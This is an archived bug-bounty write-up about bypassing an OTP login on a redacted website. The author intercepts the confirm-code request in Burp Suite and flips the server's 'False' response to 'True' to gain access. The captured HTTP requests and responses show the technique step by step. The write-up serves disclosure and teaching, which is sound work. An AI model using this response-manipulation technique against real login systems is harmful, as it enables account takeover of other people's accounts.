# Response Manipulation to Account Takeover

- **Source URL:** https://medium.com/@omranisecurity/response-manipulation-to-account-takeover-f5a1dfe1d878?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20231012150838/https://medium.com/@omranisecurity/response-manipulation-to-account-takeover-f5a1dfe1d878
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/3996 (id 3996)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Response Manipulation to Account Takeover

--

Hello everyone,

I am excited to share my first write-up with you and I hope you find it informative and interesting. My goal is to share my knowledge with others and to achieve this, I decided to write my first write-up.

After conducting some search on Google, I ultimately selected a website. The website in question is called redacted.com, which provides a variety of services including a video subscription service. To evaluate the login form and authentication process, I created an account.

The registration and entry procedures were carried out via phone numbers and After finishing my registration, I attempted to log in to my account.

I provided my mobile number and awaited the OTP code.

I submitted the correct OTP code and clicked the confirmation button. Then, I captured the request response in Burp Suite’s proxy intercept:

```
POST /Account/CheckConfirmCode HTTP/1.1
Host: redacted.com
Cookie: .AspNetCore.Session=******************
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecho/20100101 Firefox/99.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Lenght: 23
Origin: https://accounta.redacted.com
Referrer: https://accounts.redacted.com/Account/Confirm
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
connection: close
{
"ConfirmCode":"36009"
}
```
Response to that request:

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Server: Kestrel
X-Powered-By: ASP.NET
Date: Sun, 01 May 2022 07:57:44 GMT
Connection: close
Content-Length: 4
True
```
I entered my mobile number again, but this time I entered the wrong OTP code and you can see the response:

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Server: Kestrel
X-Powered-By: ASP.NET
Date: Sun, 01 May 2022 08:10:23 GMT
Connection: close
Content-Length: 5
False
```
After understanding the true and false response states, I modified the response body from False to True.

And Boom !

Now I was able to log in to my account :)

Trying out this scenario can be done in various ways with a little creativity.

Twitter: [https://twitter.com/omranisecurity](https://twitter.com/omranisecurity)

Instagram: [https://www.instagram.com/omranisecurity/](https://www.instagram.com/omranisecurity/)

LinkedIn: [https://www.linkedin.com/in/omranisecurity/](https://www.linkedin.com/in/omranisecurity/)
